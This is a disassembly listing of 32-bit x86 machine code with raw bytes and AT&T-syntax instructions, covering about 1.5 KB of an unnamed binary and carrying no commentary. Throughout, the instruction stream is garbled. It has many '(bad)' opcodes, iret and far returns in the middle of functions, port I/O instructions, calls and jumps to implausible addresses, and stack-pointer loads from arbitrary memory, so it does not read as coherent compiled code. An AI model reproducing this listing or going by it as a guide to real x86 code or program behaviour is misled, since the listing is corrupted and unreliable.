  4066c0:	8b 06                	mov    (%esi),%eax
  4066c2:	c7 40 ed 00 00 00 00 	movl   $0x0,-0x13(%eax)
  4066c9:	8b 7a 56             	mov    0x56(%edx),%edi
  4066cc:	8b 0e                	mov    (%esi),%ecx
  4066ce:	51                   	push   %ecx
  4066cf:	e8 2c ef 0f 9b       	call   0x9b505600
  4066d4:	5f                   	pop    %edi
  4066d5:	2c 33                	sub    $0x33,%al
  4066d7:	c0 5b 5d c2          	rcrb   $0xc2,0x5d(%ebx)
  4066db:	14 00                	adc    $0x0,%al
  4066dd:	90                   	nop
  4066de:	90                   	nop
  4066df:	90                   	nop
  4066e0:	55                   	push   %ebp
  4066e1:	8b 92 ce 63 75 08    	mov    0x87563ce(%edx),%edx
  4066e7:	8b 46 04             	mov    0x4(%esi),%eax
  4066ea:	cb                   	lret
  4066eb:	f8                   	clc
  4066ec:	ff 74 29 50          	push   0x50(%ecx,%ebp,1)
  4066f0:	dc 15 01 98 40 58    	fcoml  0x58409801
  4066f6:	ee                   	out    %al,(%dx)
  4066f7:	f8                   	clc
  4066f8:	35 75 16 44 35       	xor    $0x35441675,%eax
  4066fd:	d8 c1                	fadd   %st(1),%st
  4066ff:	49                   	dec    %ecx
  406700:	00 1d d6 87 c0 74    	add    %bl,0x74c087d6
  406706:	29 10                	sub    %edx,(%eax)
  406708:	d6                   	salc
  406709:	d0 13                	rclb   $1,(%ebx)
  40670b:	fc                   	cld
  40670c:	6f                   	outsl  %ds:(%esi),(%dx)
  40670d:	00 5e 5d             	add    %bl,0x5d(%esi)
  406710:	c3                   	ret
  406711:	c7 46 04 ff a0 ff ff 	movl   $0xffffa0ff,0x4(%esi)
  406718:	8b 24 40             	mov    (%eax,%eax,2),%esp
  40671b:	85 c0                	test   %eax,%eax
  40671d:	74 11                	je     0x406730
  40671f:	8b 40 10             	mov    0x10(%eax),%eax
  406722:	50                   	push   %eax
  406723:	a1 15 74 c0 40       	mov    0x40c07415,%eax
  406728:	00 c7                	add    %al,%bh
  40672a:	46                   	inc    %esi
  40672b:	40                   	inc    %eax
  40672c:	00 00                	add    %al,(%eax)
  40672e:	00 00                	add    %al,(%eax)
  406730:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406731:	c0 5e c5 c3          	rcrb   $0xc3,-0x3b(%esi)
  406735:	6e                   	outsb  %ds:(%esi),(%dx)
  406736:	90                   	nop
  406737:	0e                   	push   %cs
  406738:	90                   	nop
  406739:	90                   	nop
  40673a:	90                   	nop
  40673b:	90                   	nop
  40673c:	13 90 90 90 b6 8b    	adc    -0x74496f70(%eax),%edx
  406742:	ec                   	in     (%dx),%al
  406743:	8b 45 10             	mov    0x10(%ebp),%eax
  406746:	8b 4d 14             	mov    0x14(%ebp),%ecx
  406749:	56                   	push   %esi
  40674a:	8b 75 08             	mov    0x8(%ebp),%esi
  40674d:	57                   	push   %edi
  40674e:	8b 7d a8             	mov    -0x58(%ebp),%edi
  406751:	8b 56 10             	mov    0x10(%esi),%edx
  406754:	6a 00                	push   $0x0
  406756:	57                   	push   %edi
  406757:	52                   	push   %edx
  406758:	89 b2 08 89 4e 0c    	mov    %esi,0xc4e8908(%edx)
  40675e:	e8 6d 06 00 00       	call   0x406dd0
  406763:	d6                   	salc
  406764:	46                   	inc    %esi
  406765:	14 6a                	adc    $0x6a,%al
  406767:	00 57 50             	add    %dl,0x50(%edi)
  40676a:	4c                   	dec    %esp
  40676b:	61                   	popa
  40676c:	06                   	push   %es
  40676d:	00 00                	add    %al,(%eax)
  40676f:	83 c4 18             	add    $0x18,%esp
  406772:	76 5e                	jbe    0x4067d2
  406774:	b3 43                	mov    $0x43,%bl
  406776:	90                   	nop
  406777:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406778:	90                   	nop
  406779:	90                   	nop
  40677a:	90                   	nop
  40677b:	90                   	nop
  40677c:	90                   	nop
  40677d:	90                   	nop
  40677e:	90                   	nop
  40677f:	f7 55 fc             	notl   -0x4(%ebp)
  406782:	ec                   	in     (%dx),%al
  406783:	53                   	push   %ebx
  406784:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406787:	56                   	push   %esi
  406788:	57                   	push   %edi
  406789:	aa                   	stos   %al,%es:(%edi)
  40678a:	50                   	push   %eax
  40678b:	87 e8                	xchg   %ebp,%eax
  40678d:	cf                   	iret
  40678e:	e2 ff                	loop   0x40678f
  406790:	ff 8b 75 08 8b f8    	decl   -0x774f78b(%ebx)
  406796:	33 c0                	xor    %eax,%eax
  406798:	8b 0c b9             	mov    (%ecx,%edi,4),%ecx
  40679b:	14 8e                	adc    $0x8e,%al
  40679d:	00 00                	add    %al,(%eax)
  40679f:	6a 38                	push   $0x38
  4067a1:	0a d7                	or     %bh,%dl
  4067a3:	16                   	push   %ss
  4067a4:	16                   	push   %ss
  4067a5:	89 1a                	mov    %ebx,(%edx)
  4067a7:	4c                   	dec    %esp
  4067a8:	06                   	push   %es
  4067a9:	8b 08                	mov    (%eax),%ecx
  4067ab:	7a e8                	jp     0x406795
  4067ad:	af                   	scas   %es:(%edi),%eax
  4067ae:	5a                   	pop    %edx
  4067af:	ff                   	(bad)
  4067b0:	ff 8b f8 33 c0 e8    	decl   -0x173fcc08(%ebx)
  4067b6:	d7                   	xlat   %ds:(%ebx)
  4067b7:	86 0e                	xchg   %cl,(%esi)
  4067b9:	00 00                	add    %al,(%eax)
  4067bb:	00 f3                	add    %dh,%bl
  4067bd:	ab                   	stos   %eax,%es:(%edi)
  4067be:	97                   	xchg   %eax,%edi
  4067bf:	06                   	push   %es
  4067c0:	6a cd                	push   $0xffffffcd
  4067c2:	72 50                	jb     0x406814
  4067c4:	10 96 0e 8b b1 10    	adc    %dl,0x10b18b0e(%esi)
  4067ca:	89 1a                	mov    %ebx,(%edx)
  4067cc:	8b 06                	mov    (%esi),%eax
  4067ce:	8b 08                	mov    (%eax),%ecx
  4067d0:	51                   	push   %ecx
  4067d1:	e8 8a e2 ff ff       	call   0x404a60
  4067d6:	a2 f8 90 be 8b       	mov    %al,0x8bbe90f8
  4067db:	d7                   	xlat   %ds:(%ebx)
  4067dc:	b9 0e 00 4e 00       	mov    $0x4e000e,%ecx
  4067e1:	f3 ab                	rep stos %eax,%es:(%edi)
  4067e3:	8b 06                	mov    (%esi),%eax
  4067e5:	6a 0e                	push   $0xe
  4067e7:	53                   	push   %ebx
  4067e8:	6a 01                	push   $0x1
  4067ea:	89 50 14             	mov    %edx,0x14(%eax)
  4067ed:	8b 0e                	mov    (%esi),%ecx
  4067ef:	8b 8d 14 b6 1a 8b    	mov    -0x74e549ec(%ebp),%ecx
  4067f5:	06                   	push   %es
  4067f6:	c7 40 34 01 a6 7c 00 	movl   $0x7ca601,0x34(%eax)
  4067fd:	02 0e                	add    (%esi),%cl
  4067ff:	83 c1 48             	add    $0x48,%ecx
  406802:	51                   	push   %ecx
  406803:	cf                   	iret
  406804:	08 f8                	or     %bh,%al
  406806:	ff                   	(bad)
  406807:	ff b1 5e ed 44 c3    	push   -0x3cbb12a2(%ecx)
  40680d:	91                   	xchg   %eax,%ecx
  40680e:	90                   	nop
  40680f:	90                   	nop
  406810:	55                   	push   %ebp
  406811:	8b ec                	mov    %esp,%ebp
  406813:	56                   	push   %esi
  406814:	8f                   	(bad)
  406815:	75 08                	jne    0x40681f
  406817:	68 e0 c2 40 00       	push   $0x40c2e0
  40681c:	56                   	push   %esi
  40681d:	8b 06                	mov    (%esi),%eax
  40681f:	50                   	push   %eax
  406820:	e8 1b 88 ff ff       	call   0x3ff040
  406825:	56                   	push   %esi
  406826:	e8 b5 fe ff ff       	call   0x4066e0
  40682b:	83 82 04 9f 26 c2 04 	addl   $0x4,-0x3dd960fc(%edx)
  406832:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
  406838:	50                   	push   %eax
  406839:	90                   	nop
  40683a:	90                   	nop
  40683b:	90                   	nop
  40683c:	90                   	nop
  40683d:	90                   	nop
  40683e:	90                   	nop
  40683f:	90                   	nop
  406840:	55                   	push   %ebp
  406841:	17                   	pop    %ss
  406842:	ec                   	in     (%dx),%al
  406843:	48                   	dec    %eax
  406844:	ec                   	in     (%dx),%al
  406845:	10 af 00 00 53 8b    	adc    %ch,-0x74ad0000(%edi)
  40684b:	5d                   	pop    %ebp
  40684c:	08 56 8b             	or     %dl,-0x75(%esi)
  40684f:	8b 43 04             	mov    0x4(%ebx),%eax
  406852:	ea b2 ff 0f 84 94 01 	ljmp   $0x194,$0x840fffb2
  406859:	00 00                	add    %al,(%eax)
  40685b:	15 4b 10 85 c9       	adc    $0xc985104b,%eax
  406860:	0f 84 89 01 ae 00    	je     0xee69ef
  406866:	8b 75 0c             	mov    0xc(%ebp),%esi
  406869:	8b 4e 14             	mov    0x14(%esi),%ecx
  40686c:	8d                   	lea    (bad),%edx
  40686d:	d1 28                	shrl   $1,(%eax)
  40686f:	1f                   	pop    %ds
  406870:	52                   	push   %edx
  406871:	50                   	push   %eax
  406872:	ff 15 de 33 40 00    	call   *0x4033de
  406878:	83 f8 ff             	cmp    $0xffffffff,%eax
  40687b:	0f 85 37 01 00 00    	jne    0x4069b8
  406881:	8b 35 d8 80 40 55    	mov    0x554080d8,%esi
  406887:	ff d6                	call   *%esi
  406889:	85 c0                	test   %eax,%eax
  40688b:	0f 84 f9 cc 00 00    	je     0x41358a
  406891:	ff d6                	call   *%esi
  406893:	05 0a fc ff 00       	add    $0xfffc0a,%eax
  406898:	b9 b3 23 0b 00       	mov    $0xb23b3,%ecx
  40689d:	0f 85 51 01 00 36    	jne    0x364069f4
  4068a3:	8b 7b 20             	mov    0x20(%ebx),%edi
  4068a6:	8b c7                	mov    %edi,%eax
  4068a8:	24 8b                	and    $0x8b,%al
  4068aa:	c7                   	(bad)
  4068ab:	0b ea                	or     %edx,%ebp
  4068ad:	75 a5                	jne    0x406854
  4068af:	ea 3f b8 b4 03 0b 00 	ljmp   $0xb,$0x3b4b83f
  4068b6:	5b                   	pop    %ebx
  4068b7:	8b e5                	mov    %ebp,%esp
  4068b9:	5d                   	pop    %ebp
  4068ba:	59                   	pop    %ecx
  4068bb:	cf                   	iret
  4068bc:	00 8b 43 0d a5 01    	add    %cl,0x1a50d43(%ebx)
  4068c2:	00 00                	add    %al,(%eax)
  4068c4:	e3 85                	jecxz  0x40684b
  4068c6:	f6 68 85             	imulb  -0x7b(%eax)
  4068c9:	f4                   	hlt
  4068ca:	fd                   	std
  4068cb:	cd be                	int    $0xbe
  4068cd:	89 8d 83 fd ff 48    	mov    %ecx,0x48fffd83(%ebp)
  4068d3:	89 70 f8             	mov    %esi,-0x8(%eax)
  4068d6:	fe                   	(bad)
  4068d7:	ff                   	(bad)
  4068d8:	ff                   	(bad)
  4068d9:	7a 8d                	jp     0x406868
  4068db:	f4                   	hlt
  4068dc:	fe                   	(bad)
  4068dd:	ff                   	(bad)
  4068de:	ff                   	(bad)
  4068df:	7f 6f                	jg     0x406950
  4068e1:	7c 04                	jl     0x4068e7
  4068e3:	85 ff                	test   %edi,%edi
  4068e5:	da 04 d7             	fiaddl (%edi,%edx,8)
  4068e8:	c0 eb 25             	shr    $0x25,%bl
  4068eb:	6a af                	push   $0xffffffaf
  4068ed:	68 40 42 0f 1e       	push   $0x1e0f4240
  4068f2:	56                   	push   %esi
  4068f3:	57                   	push   %edi
  4068f4:	e8 97 4c 00 00       	call   0x40b590
  4068f9:	d1 00                	roll   $1,(%eax)
  4068fb:	68 40 42 0f 00       	push   $0xf4240
  406900:	56                   	push   %esi
  406901:	57                   	push   %edi
  406902:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406905:	ee                   	out    %al,(%dx)
  406906:	46                   	inc    %esi
  406907:	45                   	inc    %ebp
  406908:	00 00                	add    %al,(%eax)
  40690a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40690d:	8d 45 0b             	lea    0xb(%ebp),%eax
  406910:	5a                   	pop    %edx
  406911:	8d 82 fe f0 ff d3    	lea    -0x2c000f02(%edx),%eax
  406917:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  40691d:	51                   	push   %ecx
  40691e:	52                   	push   %edx
  40691f:	6a 00                	push   $0x0
  406921:	6a 41                	push   $0x41
  406923:	9b                   	fwait
  406924:	e0 c4                	loopne 0x4068ea
  406926:	c1 40 00 83          	roll   $0x83,0x0(%eax)
  40692a:	15 2c 89 45 43       	adc    $0x4345892c,%eax
  40692f:	74 4d                	je     0x40697e
  406931:	85 c0                	test   %eax,%eax
  406933:	75 0e                	jne    0x406943
  406935:	5f                   	pop    %edi
  406936:	5e                   	pop    %esi
  406937:	b8 cc 24 0b 15       	mov    $0x150b24cc,%eax
  40693c:	5b                   	pop    %ebx
  40693d:	83 e5 5d             	and    $0x5d,%ebp
  406940:	c2 08 00             	ret    $0x8
  406943:	8b 4b 04             	mov    0x4(%ebx),%ecx
  406946:	aa                   	stos   %al,%es:(%edi)
  406947:	85 2a                	test   %ebp,(%edx)
  406949:	fe                   	(bad)
  40694a:	ff                   	(bad)
  40694b:	ff 50 51             	call   *0x51(%eax)
  40694e:	e8 0d 50 00 00       	call   0x40b960
  406953:	32 c0                	xor    %al,%al
  406955:	74 f5                	je     0x40694c
  406957:	8b 4b ca             	mov    -0x36(%ebx),%ecx
  40695a:	0b 55 0c             	or     0xc(%ebp),%edx
  40695d:	8d 45 08             	lea    0x8(%ebp),%eax
  406960:	52                   	push   %edx
  406961:	50                   	push   %eax
  406962:	68 07 10 f7 00       	push   $0xf71007
  406967:	68 ff 0d 37 00       	push   $0x370dff
  40696c:	25 c7 45 0c 04       	and    $0x40c45c7,%eax
  406971:	00 aa 74 55 5c a0    	add    %ch,-0x5fa3aa8c(%edx)
  406977:	c1 40 00 85          	roll   $0x85,0x0(%eax)
  40697b:	c0 bd 27 1f 35 1a c1 	sarb   $0xc1,0x1a351f27(%ebp)
  406982:	40                   	inc    %eax
  406983:	00 5e d6             	add    %bl,-0x2a(%esi)
  406986:	85 63 48             	test   %esp,0x48(%ebx)
  406989:	24 5f                	and    $0x5f,%al
  40698b:	5e                   	pop    %esi
  40698c:	33 c0                	xor    %eax,%eax
  40698e:	e6 8b                	out    %al,$0x8b
  406990:	e5 5d                	in     $0x5d,%eax
  406992:	c2 08 00             	ret    $0x8
  406995:	ff d6                	call   *%esi
  406997:	5f                   	pop    %edi
  406998:	c7 05 80 fc 0a 00 5b 	movl   $0x5d198b5b,0xafc80
  40699f:	8b 19 5d 
  4069a2:	c2 08 00             	ret    $0x8
  4069a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4069a8:	85 20                	test   %esp,(%eax)
  4069aa:	a3 eb 5f 5e 5b       	mov    %eax,0x5b5e5feb
  4069af:	72 e5                	jb     0x406996
  4069b1:	52                   	push   %edx
  4069b2:	c2 08 00             	ret    $0x8
  4069b5:	8b 75 0c             	mov    0xc(%ebp),%esi
  4069b8:	8b 43 10             	mov    0x10(%ebx),%eax
  4069bb:	3d 73 14 66 83       	cmp    $0x83661473,%eax
  4069c0:	78 2a                	js     0x4069ec
  4069c2:	00 75 07             	add    %dh,0x7(%ebp)
  4069c5:	c7 06 2c 01 00 77    	movl   $0x7700012c,(%esi)
  4069cb:	9e                   	sahf
  4069cc:	8b 48 18             	mov    0x18(%eax),%ecx
  4069cf:	e4 70                	in     $0x70,%al
  4069d1:	20 bf 9e 04 41 00    	and    %bh,0x41049e(%edi)
  4069d7:	33 f4                	xor    %esp,%esi
  4069d9:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4069db:	75 ad                	jne    0x40698a
  4069dd:	5f                   	pop    %edi
  4069de:	c7 43 e3 2b 3e 00 00 	movl   $0x3e2b,-0x1d(%ebx)
  4069e5:	5e                   	pop    %esi
  4069e6:	33 c0                	xor    %eax,%eax
  4069e8:	5b                   	pop    %ebx
  4069e9:	8b e5                	mov    %ebp,%esp
  4069eb:	5d                   	pop    %ebp
  4069ec:	c2 08 00             	ret    $0x8
  4069ef:	b8 ef 75 09 00       	mov    $0x975ef,%eax
  4069f4:	5f                   	pop    %edi
  4069f5:	5e                   	pop    %esi
  4069f6:	5b                   	pop    %ebx
  4069f7:	8b 25 5d c2 92 00    	mov    0x92c25d,%esp
  4069fd:	90                   	nop
  4069fe:	90                   	nop
  4069ff:	90                   	nop
  406a00:	55                   	push   %ebp
  406a01:	b2 ec                	mov    $0xec,%dl
  406a03:	83 ec 08             	sub    $0x8,%esp
  406a06:	8d 45 0b             	lea    0xb(%ebp),%eax
  406a09:	56                   	push   %esi
  406a0a:	9d                   	popf
  406a0b:	ff 15 22 c0 9c 00    	call   *0x9cc022
  406a11:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406a14:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406a17:	5a                   	pop    %edx
  406a18:	f6 33                	divb   (%ebx)
  406a1a:	c9                   	leave
  406a1b:	0b d6                	or     %esi,%edx
  406a1d:	56                   	push   %esi
  406a1e:	01 c8                	add    %ecx,%eax
  406a20:	6a 0a                	push   $0xa
  406a22:	52                   	push   %edx
  406a23:	51                   	push   %ecx
  406a24:	e8 67 a9 00 86       	call   0x86411390
  406a29:	2d 00 40 86 45       	sub    $0x45864000,%eax
  406a2e:	5e                   	pop    %esi
  406a2f:	81 da c8 31 52 00    	sbb    $0x5231c8,%edx
  406a35:	8b 2e                	mov    (%esi),%ebp
  406a37:	5d                   	pop    %ebp
  406a38:	c3                   	ret
  406a39:	90                   	nop
  406a3a:	90                   	nop
  406a3b:	90                   	nop
  406a3c:	90                   	nop
  406a3d:	90                   	nop
  406a3e:	44                   	inc    %esp
  406a3f:	2b 93 8b ec 8b 45    	sub    0x458bec8b(%ebx),%edx
  406a45:	0c 33                	or     $0x33,%al
  406a47:	c9                   	leave
  406a48:	56                   	push   %esi
  406a49:	e3 f6                	jecxz  0x406a41
  406a4b:	66 8b 48 0e          	mov    0xe(%eax),%cx
  406a4f:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  406a52:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  406a55:	8d                   	lea    (bad),%ebp
  406a56:	e9 89 8b 4d 80       	jmp    0x808df5e4
  406a5b:	9c                   	pushf
  406a5c:	e2 03                	loop   0x406a61
  406a5e:	89 11                	mov    %edx,(%ecx)
  406a60:	03 d2                	add    %edx,%edx
  406a62:	66 8b 50 0c          	mov    0xc(%eax),%dx
  406a66:	89 51 04             	mov    %edx,0x4(%ecx)
  406a69:	33 d2                	xor    %edx,%edx
  406a6b:	a0 8b 50 46 89       	mov    0x8946508b,%al
  406a70:	51                   	push   %ecx
  406a71:	08 33                	or     %dh,(%ebx)
  406a73:	3a d4                	cmp    %ah,%dl
  406a75:	8b 50 11             	mov    0x11(%eax),%edx
  406a78:	34 51                	xor    $0x51,%al
  406a7a:	0c 33                	or     $0x33,%al
  406a7c:	91                   	xchg   %eax,%ecx
  406a7d:	66 0a 50 06          	data16 or 0x6(%eax),%dl
  406a81:	80 1a 10             	sbbb   $0x10,(%edx)
  406a84:	33 d2                	xor    %edx,%edx
  406a86:	66 8b d7             	mov    %di,%dx
  406a89:	02 8b 89 51 14 38    	add    0x38145189(%ebx),%cl
  406a8f:	d2 66 8b             	shlb   %cl,-0x75(%esi)
  406a92:	10 81 ea e7 07 00    	adc    %al,0x7e7ea(%ecx)
  406a98:	00 9c 5a 18 33 d2 66 	add    %bl,0x66d23318(%edx,%ebx,2)
  406a9f:	8b 50 04             	mov    0x4(%eax),%edx
  406aa2:	89 51 1c             	mov    %edx,0x1c(%ecx)
  406aa5:	2d 51 14 9b 1d       	sub    $0x1d9b1451,%eax
  406aaa:	70 06                	jo     0x406ab2
  406aac:	8b 14 95 40 c2 40 00 	mov    0x40c240(,%edx,4),%edx
  406ab3:	c5 28                	lds    (%eax),%ebp
  406ab5:	32 ff                	xor    %bh,%bh
  406ab7:	33 f6                	xor    %esi,%esi
  406ab9:	89 51 20             	mov    %edx,0x20(%ecx)
  406abc:	33 d2                	xor    %edx,%edx
  406abe:	89 51 28             	mov    %edx,0x28(%ecx)
  406ac1:	89 51 28             	mov    %edx,0x28(%ecx)
  406ac4:	66 8b d3             	mov    %bx,%dx
  406ac7:	8b c6                	mov    %esi,%eax
  406ac9:	25 03 00 00 80       	and    $0x80000003,%eax
  406ace:	79 05                	jns    0x406ad5
  406ad0:	48                   	dec    %eax
  406ad1:	83 c8 fc             	or     $0xfffffffc,%eax
  406ad4:	e7 75                	out    %eax,$0x75
  406ad6:	2a 8b 28 57 99 bf    	sub    -0x4066a8d8(%ebx),%cl
  406adc:	b6 01                	mov    $0x1,%dh
  406ade:	5b                   	pop    %ebx
  406adf:	2e f7 ff             	cs idiv %edi
  406ae2:	9f                   	lahf
  406ae3:	85 d2                	test   %edx,%edx
  406ae5:	75 1a                	jne    0x406b01
  406ae7:	21 c2                	and    %eax,%edx
  406ae9:	be 64 ee 00 8c       	mov    $0x8c00ee64,%esi
  406aee:	99                   	cltd
  406aef:	12 fe                	adc    %dh,%bh
  406af1:	95                   	xchg   %eax,%ebp
  406af2:	d2 74 ab 8b          	shlb   %cl,-0x75(%ebx,%ebp,4)
  406af6:	b8 20 83 f8 3a       	mov    $0x3af88320,%eax
  406afb:	7e 04                	jle    0x406b01
  406afd:	40                   	inc    %eax
  406afe:	a2 88 20 5e 54       	mov    %al,0x545e2088
  406b03:	c3                   	ret
  406b04:	41                   	inc    %ecx
  406b05:	90                   	nop
  406b06:	67 90                	addr16 nop
  406b08:	90                   	nop
  406b09:	90                   	nop
  406b0a:	90                   	nop
  406b0b:	90                   	nop
  406b0c:	5c                   	pop    %esp
  406b0d:	90                   	nop
  406b0e:	90                   	nop
  406b0f:	90                   	nop
  406b10:	55                   	push   %ebp
  406b11:	8b ec                	mov    %esp,%ebp
  406b13:	81 ec e0 3a 00 00    	sub    $0x3ae0,%esp
  406b19:	53                   	push   %ebx
  406b1a:	56                   	push   %esi
  406b1b:	8b 75 25             	mov    0x25(%ebp),%esi
  406b1e:	57                   	push   %edi
  406b1f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406b22:	f3 ce                	repz into
  406b24:	3c c7                	cmp    $0xc7,%al
  406b26:	6a 00                	push   $0x0
  406b28:	05 00 cb 86 48       	add    $0x4886cb00,%eax
  406b2d:	df 0a                	fisttps (%edx)
  406b2f:	81 d1 79 5e 29 00    	adc    $0x295e79,%ecx
  406b35:	51                   	push   %ecx
  406b36:	4f                   	dec    %edi
  406b37:	e8 04 4a 00 00       	call   0x40b540
  406b3c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406b3d:	45                   	inc    %ebp
  406b3e:	ec                   	in     (%dx),%al
  406b3f:	8b 12                	mov    (%edx),%edx
  406b41:	c1 f8 1f             	sar    $0x1f,%eax
  406b44:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b45:	dc c0                	fadd   %st,%st(0)
  406b47:	41                   	inc    %ecx
  406b48:	00 89 55 e1 82 f8    	add    %cl,-0x77d1eab(%ecx)
  406b4e:	73 0f                	jae    0x406b5f
  406b50:	ef                   	out    %eax,(%dx)
  406b51:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406b52:	00 00                	add    %al,(%eax)
  406b54:	78 8d                	js     0x406ae3
  406b56:	4d                   	dec    %ebp
  406b57:	fc                   	cld
  406b58:	51                   	push   %ecx
  406b59:	e8 b2 0d d5 00       	call   0x1157910
  406b5e:	d3 a3 04 8d 55 dc    	shll   %cl,-0x23aa72fc(%ebx)
  406b64:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406b67:	52                   	push   %edx
  406b68:	d9 ff                	fcos
  406b6a:	15 7c c0 40 00       	adc    $0x40c07c,%eax
  406b6f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b72:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406b75:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406b78:	51                   	push   %ecx
  406b79:	52                   	push   %edx
  406b7a:	50                   	push   %eax
  406b7b:	ff 15 47 c0 40 00    	call   *0x40c047
  406b81:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406b84:	8d 4d 19             	lea    0x19(%ebp),%ecx
  406b87:	51                   	push   %ecx
  406b88:	c0 a4 b2 e1 ff ff 83 	shlb   $0xc4,-0x7c00001f(%edx,%esi,4)
  406b8f:	c4 
  406b90:	08 6a 00             	or     %ch,0x0(%edx)
  406b93:	18 30                	sbb    %dh,(%eax)
  406b95:	42                   	inc    %edx
  406b96:	0f 00 56 57          	lldt   0x57(%esi)
  406b9a:	e8 b1 e5 00 00       	call   0x415150
  406b9f:	c7 03 fa 55 f4 8d    	movl   $0x8df455fa,(%ebx)
  406ba5:	45                   	inc    %ebp
  406ba6:	cc                   	int3
  406ba7:	52                   	push   %edx
  406ba8:	50                   	push   %eax
  406ba9:	2b 15 88 a6 40 92    	sub    0x9240a688,%edx
  406baf:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406bb2:	8b 45 c3             	mov    -0x3d(%ebp),%eax
  406bb5:	33 f6                	xor    %esi,%esi
  406bb7:	33 c9                	xor    %ecx,%ecx
  406bb9:	38 d6                	cmp    %dl,%dh
  406bbb:	63 0b                	arpl   %ecx,(%ebx)
  406bbd:	c8 6a 0a 52          	enter  $0xa6a,$0x52
  406bc1:	93                   	xchg   %eax,%ebx
  406bc2:	e8 c9 63 00 00       	call   0x40cf90
  406bc7:	2d 67 ef 86 48       	sub    $0x4886ef67,%eax
  406bcc:	56                   	push   %esi
  406bcd:	b6 da                	mov    $0xda,%dh
  406bcf:	96                   	xchg   %eax,%esi
  406bd0:	5e                   	pop    %esi
  406bd1:	29 00                	sub    %eax,(%eax)
  406bd3:	68 40 ba 0f 00       	push   $0xfba40
  406bd8:	52                   	push   %edx
  406bd9:	50                   	push   %eax
  406bda:	e8 cd be 4a 00       	call   0x8b2aac
  406bdf:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406be2:	6a 00                	push   $0x0
  406be4:	68 40 42 0f 00       	push   $0xf4240
  406be9:	86 57 8b             	xchg   %dl,-0x75(%edi)
  406bec:	4f                   	dec    %edi
  406bed:	e8 9e 49 f0 00       	call   0x130b590
  406bf2:	2b f0                	sub    %eax,%esi
  406bf4:	8b 64 fc 89          	mov    -0x77(%esp,%edi,8),%esp
  406bf8:	73 28                	jae    0x406c22
  406bfa:	8b 78 58             	mov    0x58(%eax),%edi
  406bfd:	8b 08                	mov    (%eax),%ecx
  406bff:	58                   	pop    %eax
  406c00:	83 b8 89 88 88 88 f7 	cmpl   $0xfffffff7,-0x77777777(%eax)
  406c07:	ef                   	out    %eax,(%dx)
  406c08:	8b ca                	mov    %edx,%ecx
  406c0a:	b8 c5 b3 a2 91       	mov    $0x91a2b3c5,%eax
  406c0f:	03 cf                	add    %edi,%ecx
  406c11:	c1 ff 05             	sar    $0x5,%edi
  406c14:	8b d1                	mov    %ecx,%edx
  406c16:	c1 ea ae             	shr    $0xae,%edx
  406c19:	03 ca                	add    %edx,%ecx
  406c1b:	f7 ee                	imul   %esi
  406c1d:	03 d6                	add    %esi,%edx
  406c1f:	c1 fa 0b             	sar    $0xb,%edx
  406c22:	8b c2                	mov    %edx,%eax
  406c24:	03 d1                	add    %ecx,%edx
  406c26:	c1 e8 1f             	shr    $0x1f,%eax
  406c29:	a0 c2 ab 43 24       	mov    0x2443abc2,%al
  406c2e:	5f                   	pop    %edi
  406c2f:	4f                   	dec    %edi
  406c30:	33 c0                	xor    %eax,%eax
  406c32:	5b                   	pop    %ebx
  406c33:	a8 e5                	test   $0xe5,%al
  406c35:	5d                   	pop    %ebp
  406c36:	c2 0c 00             	ret    $0xc
  406c39:	8d 4d 2f             	lea    0x2f(%ebp),%ecx
  406c3c:	8d 55 6f             	lea    0x6f(%ebp),%edx
  406c3f:	51                   	push   %ecx
  406c40:	52                   	push   %edx
  406c41:	ff 15 84 7f 40 00    	call   *0x407f84
  406c47:	8d 24 dc             	lea    (%esp,%ebx,8),%esp
  406c4a:	8d 4d d2             	lea    -0x2e(%ebp),%ecx
  406c4d:	50                   	push   %eax
  406c4e:	51                   	push   %ecx
  406c4f:	ff 15 7c c0 40 00    	call   *0x40c07c
  406c55:	c4 5d 08             	les    0x8(%ebp),%ebx
  406c58:	df 55 dc             	fists  -0x24(%ebp)
  406c5b:	52                   	push   %edx
  406c5c:	53                   	push   %ebx
  406c5d:	e0 de                	loopne 0x406c3d
  406c5f:	fd                   	std
  406c60:	ff                   	(bad)
  406c61:	ff 83 82 08 6a 00    	incl   0x6a0882(%ebx)
  406c67:	68 40 3e 0f 00       	push   $0xf3e40
  406c6c:	56                   	push   %esi
  406c6d:	78 e8                	js     0x406c57
  406c6f:	dd 4a 43             	fisttpll 0x43(%edx)
  406c72:	00 89 03 8d 85 c3    	add    %cl,-0x3c7a72fd(%ecx)
  406c78:	ff                   	(bad)
  406c79:	ff                   	(bad)
  406c7a:	ff 50 ff             	call   *-0x1(%eax)
  406c7d:	15 d0 c0 40 4c       	adc    $0x4c40c0d0,%eax
  406c82:	33 c9                	xor    %ecx,%ecx
  406c84:	43                   	inc    %ebx
  406c85:	c1 74 5e 48 74       	shll   $0x74,0x48(%esi,%ebx,2)
  406c8a:	30 48 75             	xor    %cl,0x75(%eax)
  406c8d:	70 8b                	jo     0x406c1a
  406c8f:	8d 20                	lea    (%eax),%esp
  406c91:	ff                   	(bad)
  406c92:	ff                   	(bad)
  406c93:	ff 8b 55 c8 de 4b    	decl   0x4bdec855(%ebx)
  406c99:	43                   	inc    %ebx
  406c9a:	bb 01 00 3a b3       	mov    $0xb33a0001,%ebx
  406c9f:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  406ca2:	5e                   	pop    %esi
